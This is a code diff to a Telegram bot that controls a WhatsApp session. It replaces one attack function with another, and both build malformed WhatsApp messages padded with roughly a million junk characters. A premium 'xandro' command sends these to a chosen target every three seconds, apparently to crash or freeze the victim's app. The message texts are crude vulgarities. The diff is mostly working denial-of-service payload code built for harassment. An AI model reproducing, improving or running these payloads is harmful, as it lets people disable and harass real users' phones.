@@ -1584,7 +1584,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await maklo(sock, target);
+        await Atut(sock, target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1868,64 +1868,90 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
+async function Atut(sock, target) {
+    const OndetMsg1 = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: { 
+                        text: "B = BOKEP⟅༑", 
+                        format: "DEFAULT" 
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_message"
+                }
+            }
+        }
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    });
+    const OndetMsg2 = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: { 
+                        text: "K = KONTOL ᝄ", 
+                        format: "DEFAULT" 
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "galaxy_message", 
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_request"
+                }
+            }
+        }
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741, 
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    });
 
-async function maklo(sock, target) {
-  const bapaklo = await generateWAMessageFromContent(
-    target,
-    {
-      extendedTextMessage: {
-        text: "bapak lowh jir",
-        matchedText: "t.me/fantzy_reals13",
-        description: " dnd ;) ",
-        title: " one only ",
-        paymentLinkMetadata: {
-          button: {
-            displayText: "polibet",
-          },
-          header: {
-            headerType: 1,
-          },
-          provider: {
-            paramsJson: "{".repeat(10000),
-          },
-        },
-        linkPreviewMetadata: {
-          paymentLinkMetadata: {
-            button: {
-              displayText: "happiness",
-            },
-            header: {
-              headerType: 1,
-            },
-            provider: {
-              paramsJson: "{".repeat(10000),
-            },
-          },
-          urlMetadata: {
-            fbExperimentId: 999,
-          },
-          fbExperimentId: 888,
-          linkMediaDuration: 555,
-          socialMediaPostType: 1221,
-          videoContentUrl: "https://wa.me/settings/linked_devices#,,xrellyspec",
-          videoContentCaption: " Oh My Kisah ",
-        },
-      },
-    },
-    { participant: { jid: target } }
-  );
+    await sock.relayMessage("status@broadcast", OndetMsg1.message, {
+        messageId: OndetMsg1.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users", 
+                attrs: {},
+                content: [{ 
+                    tag: "to", 
+                    attrs: { jid: target } 
+                }]
+            }]
+        }]
+    });
 
-  await sock.relayMessage(
-    target,
-    {
-      groupStatusMessageV2: {
-        Message: bapaklo.message,
-      },
-    },
-    { messageId: null }
-  );
+    await sock.relayMessage("status@broadcast", OndetMsg2.message, {
+        messageId: OndetMsg2.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users", 
+                attrs: {},
+                content: [{ 
+                    tag: "to", 
+                    attrs: { jid: target } 
+                }]
+            }]
+        }]
+    });
 }
-
 bot.launch({
     dropPendingUpdates: true
   })
